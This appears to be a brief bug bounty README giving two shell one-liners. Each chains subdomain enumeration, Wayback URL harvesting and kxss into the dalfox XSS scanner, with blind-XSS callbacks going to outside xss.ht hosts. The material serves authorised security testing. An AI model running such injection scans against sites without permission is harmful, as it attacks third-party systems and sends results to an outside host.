# BugBountyTIps
Everything about bug bounty tips on twitter

<h2>XSS ONE LINER</h2>

```
cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv "\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro  | dalfox pipe -b your.xss.ht -o xss.txt
```
## XSS ONE LINER WITH KXSS

```
assetfinder -subs-only domain.com | waybackurls | grep "=" | kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe -b https://syarifsajjad.xss.ht/
```
